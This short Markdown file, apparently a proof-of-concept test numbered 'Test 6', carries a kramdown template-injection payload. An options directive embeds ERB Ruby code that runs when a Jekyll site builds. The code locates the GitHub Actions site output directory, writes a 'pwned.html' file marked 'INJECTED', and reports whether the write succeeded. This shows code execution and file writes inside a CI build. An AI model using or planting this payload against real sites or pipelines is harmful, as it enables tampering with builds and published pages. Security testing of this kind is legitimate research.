---
---

# Test 6: Write to output dir

{::options template="string://<%= d = Dir.glob('/github/workspace/_site').first; d = '/tmp/site' if d.nil?; r = 'DIR=' + d.to_s; begin; File.write(d.to_s + '/pwned.html', 'INJECTED'); r = r + ' WROTE_OK'; rescue => e; r = r + ' ERR=' + e.message; end; r %>" /}

placeholder
